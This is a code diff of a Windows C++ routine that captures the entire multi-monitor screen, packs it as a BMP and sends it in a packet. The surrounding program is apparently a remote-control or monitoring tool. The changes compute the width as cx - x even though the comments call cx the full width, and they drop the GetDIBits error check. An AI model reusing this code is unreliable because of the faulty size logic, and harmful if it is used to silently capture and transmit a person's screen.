@@ -26,24 +26,26 @@ void Screenshot::OnExit()
 
 bool Screenshot::CapureScreenshotAndSend()
 {
+    BITMAP bmpScreen = { 0 };
 	HDC hScreenDC = GetDC(NULL);
 	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
     bool ret = false;
 
-    int iXRes = GetSystemMetrics(SM_CXVIRTUALSCREEN) - GetSystemMetrics(SM_XVIRTUALSCREEN);
-    int iYRes = GetSystemMetrics(SM_CYVIRTUALSCREEN) - GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);  //left (e.g. -1024)
+    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);  //top (e.g. -34)
+    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN); //entire width (e.g. 2704)
+    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN); //entire height (e.g. 1050)
 
-	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, iXRes, iYRes);
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, cx - x, cy - y);
     if (hBitmap == NULL)
         goto Free_DC;
 
     if (!SelectObject(hMemoryDC, hBitmap))
         goto Free_DC;
 
-    if (!StretchBlt(hMemoryDC, 0, 0, iXRes, iYRes, hScreenDC, 0, 0, iXRes, iYRes, SRCCOPY))
+    if (!BitBlt(hMemoryDC, 0, 0, cx - x, cy - y, hScreenDC, x, y, SRCCOPY | CAPTUREBLT))
         goto Free_DC;
 
-	BITMAP bmpScreen;
     // Get the BITMAP from the HBITMAP
     if (!GetObject(hBitmap, sizeof(BITMAP), &bmpScreen))
         goto Free_DC;
@@ -62,7 +64,7 @@ bool Screenshot::CapureScreenshotAndSend()
     DWORD dwBmpSize = (bmpScreen.bmWidth + 7) / 8 * bmpScreen.bmHeight * biBitCount;
 	
     //Now create bmp image
-    int bmpSize = sizeof(BITMAPFILEHEADER) + (sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << biBitCount)) + dwBmpSize;
+    DWORD bmpSize = sizeof(BITMAPFILEHEADER) + (sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << biBitCount)) + dwBmpSize;
     char* packet = (char*)malloc(bmpSize + 1);
     char* bmpBuffer = packet + 1;
     ZeroMemory(bmpBuffer, bmpSize);
@@ -77,7 +79,8 @@ bool Screenshot::CapureScreenshotAndSend()
     bi->biPlanes = bmpScreen.bmPlanes;
     bi->biBitCount = bmpScreen.bmBitsPixel;
     bi->biCompression = BI_RGB;
-    bi->biClrUsed = (1 << biBitCount);
+    if (biBitCount < 24)
+        bi->biClrUsed = (1 << biBitCount);
     bi->biSizeImage = dwBmpSize;
     bi->biXPelsPerMeter = 0;
     bi->biYPelsPerMeter = 0;
@@ -88,9 +91,8 @@ bool Screenshot::CapureScreenshotAndSend()
     bmfHeader->bfSize = bmpSize;
     bmfHeader->bfType = 0x4D42; //BM   
 
-    //Copy bitmap
-    if (!GetDIBits(hMemoryDC, hBitmap, 0, bi->biHeight, lpBitmap, (LPBITMAPINFO)bi, DIB_RGB_COLORS))
-        return false;
+    //Copy bitmap. Ignore check return success or fail
+    GetDIBits(hMemoryDC, hBitmap, 0, bi->biHeight, lpBitmap, (LPBITMAPINFO)bi, DIB_RGB_COLORS);
 
     //Send bmp
     packet[0] = 0;
